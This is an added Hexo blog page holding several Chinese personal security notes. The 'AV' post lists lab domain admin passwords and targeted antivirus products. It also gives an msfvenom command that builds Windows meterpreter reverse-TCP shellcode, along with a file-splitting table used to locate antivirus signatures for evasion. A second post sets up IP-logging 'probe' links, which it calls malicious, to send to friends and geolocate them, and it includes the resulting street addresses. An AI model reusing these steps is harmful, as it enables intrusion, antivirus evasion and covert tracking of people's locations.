@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>空空随笔</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="好记性不如烂笔头，主要用于工作，学习中的随手记录">
+<meta property="og:type" content="website">
+<meta property="og:title" content="空空随笔">
+<meta property="og:url" content="http://example.com/page/5/index.html">
+<meta property="og:site_name" content="空空随笔">
+<meta property="og:description" content="好记性不如烂笔头，主要用于工作，学习中的随手记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="两袖空空">
+<meta property="article:tag" content="笔记 , 研究 , 漏洞">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="空空随笔" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">空空随笔</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">随手记</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-AV" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/AV/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T07:20:27.451Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/AV/">AV</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/09/AV/">AV</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>域hack.com-<br>    dc2008 Nat8		10.10.80.1&#x2F;24	administrator	!QAZ2wsx|!QAZ1234<br>        10.10.80.108	255.255.255.0	10.10.80.2	10.10.80.108</p>
+<p>域hack.test<br>    dc2012	Nat2	192.168.1.1&#x2F;24	administrator	!QAZ2wsx|!QAZ1234<br>        192.168.1.1		255.255.255.0	-.-.-.-		192.168.1.1</p>
+<p>target007	Nat2	Nat8<br>    10.10.80.107	255.255.255.0	10.10.80.2	10.10.80.108<br>    hack\test	!QAZ2wsx	域用户<br>    Target007\ysha  登录<br>    计算机账户而非域用户</p>
+<p>目标机杀软情况	<br>    sophos<br>    webroot endpoint protection<br>    mse</p>
+<p>McAfee</p>
+<p>PE文件组成：		组成标志 ：<br>    DOS文件头  		MZ		<br>    DOS加载模块		This is..	 	<br>    PE文件头		PE		 	<br>    区段表			.text .data<br>    区段</p>
+<p>初始位置：E0	<br>    E0前内容为保留内容，基本上每个程序都有 不参与分割</p>
+<p>10<br>特征码位置：<br>    000135B0-00015715<br>15<br>特征码位置：<br>    00011360-00014120</p>
+<p>root@kali:&#x2F;tools# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.80.102 lport&#x3D;443 -f c -o &#x2F;tools&#x2F;shellcode.c<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 510 bytes<br>Final size of c file: 2166 bytes<br>Saved as: &#x2F;tools&#x2F;shellcode.c</p>
+<p>10<br>PE文件分割初始位置：E0<br>文件名			开始位置	间隔长度	填充位置<br>000_00E0_22E9	00E0		22E9		23C9		E0+22E9<em>1<br>001_23C9_22E9	23C9		22E9		46B2		E0+22E9</em>2<br>002_46B2_22E9	46B2		22E9		699B		E0+22E9<em>3<br>003_699B_22E9	699B		22E9		8C84		E0+22E9</em>4<br>004_8C84_22E9	8C84		22E9		AF6D		E0+22E9<em>5<br>005_AF6D_22E9	AF6D		22E9		D256		E0+22E9</em>6<br>006_D256_22E9	D256		22E9		F53F		E0+22E9<em>7<br>007_F53F_22E9	F53F		22E9		11828		E0+22E9</em>8<br>008_11828_22E9	11828		22E9		13B11		E0+22E9*9<br>009_13B11_22E9	13B11		22E9		15DFA			第一次提示有毒<br>总长:15DFF</p>
+        
+          <p class="article-more-link">
+            <a href="/2023/01/09/AV/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/AV/" data-id="clcre41j60001ecvp9t1oeyyi" data-title="AV" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AV/" rel="tag">AV</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-探针" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/%E6%8E%A2%E9%92%88/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T07:20:27.443Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/09/%E6%8E%A2%E9%92%88/">探针</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://ip.ysneko.com/probe_query.php?action=probe_query">https://ip.ysneko.com/probe_query.php?action=probe_query</a></p>
+<p>123456ASDFGHQWERTY<br>1234qwer1234qwer1234qwer1234qwer</p>
+<p>生成成功，链接:<a target="_blank" rel="noopener" href="http://ip.ysneko.com/probe.php?key=123456ASDFGHQWERTY">http://ip.ysneko.com/probe.php?key=123456ASDFGHQWERTY</a><br>使用方法<br>    1.输入密钥后添加探针，返回一个链接&#x2F;卡片，发送给好友<br>    2.好友点击链接&#x2F;卡片后，点击网站上方的探针查询，即可查询IP及其他信息<br>    3.禁止非法用途，如造成严重后果作者不负责<br>    4.如该程序违法</p>
+<p>生成成功，链接:<a target="_blank" rel="noopener" href="http://ip.ysneko.com/probe.php?key=1234qwer1234qwer1234qwer1234qwer">http://ip.ysneko.com/probe.php?key=1234qwer1234qwer1234qwer1234qwer</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.baidu.com/img/baidu.gif">https://www.baidu.com/img/baidu.gif</a><br>生成成功，链接:<a target="_blank" rel="noopener" href="http://ip.ysneko.com/probe.php?key=sajdjdsbsds">http://ip.ysneko.com/probe.php?key=sajdjdsbsds</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.iculture.cc/">https://www.iculture.cc/</a></p>
+<p>IP定位<br>    输入IP到下面的页面可以找到精确的地理位置<br>    如果用户使用的流量，有可能会出现定位不精确的情况</p>
+<pre><code>高精度IP定位
+https://www.opengps.cn/Data/IP/LocHighAcc.aspx
+rtbasia IP查询
+https://ip.rtbasia.com
+ipplus360 IP查询
+http://www.ipplus360.com/ip
+IP信息查询
+https://www.ipip.net/ip.html
+IP地址查询在线工具
+https://tool.lu/ip
+</code></pre>
+<p>恶意链接<br><a target="_blank" rel="noopener" href="http://ip.iculture.cc/probe.php?key=dlsdmslads445">http://ip.iculture.cc/probe.php?key=dlsdmslads445</a><br>短链接生成<br><a target="_blank" rel="noopener" href="https://www.helingqi.com/url.php">https://www.helingqi.com/url.php</a><br>恶意短链接<br><a target="_blank" rel="noopener" href="http://t.cn/A6aQCI1N">http://t.cn/A6aQCI1N</a></p>
+<p>南京<br>经度:118.73145&#x2F;纬度:32.00335	地址：中国江苏省南京市建邺区尚元街88号<br>安徽（手机）<br>经度:117.28565&#x2F;纬度:31.86157	地址：中国安徽省合肥市庐阳区长江中路154号<br>安徽蜀山 （电脑）<br>经度:117.26061&#x2F;纬度:31.8512		地址：中国安徽省合肥市蜀山区梅山路107号</p>
+        
+          <p class="article-more-link">
+            <a href="/2023/01/09/%E6%8E%A2%E9%92%88/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/%E6%8E%A2%E9%92%88/" data-id="clcre41k7001qecvp84xwg9ki" data-title="探针" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T06:24:17.364Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/09/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2023/01/09/hello-world/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/hello-world/" data-id="clcre41jo000qecvpcc574rxp" data-title="Hello World" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/4/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AV/">AV</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Domain/">Domain</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/IPC/">IPC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/">Intranet</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/IPC/">IPC</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AV/" rel="tag">AV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AV/" style="font-size: 10px;">AV</a> <a href="/tags/Domain/" style="font-size: 10px;">Domain</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/MS17-010">MS17-010</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/%E5%BC%BA%E8%A1%8C%E6%94%B9%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/ZimbraNote/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 两袖空空<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
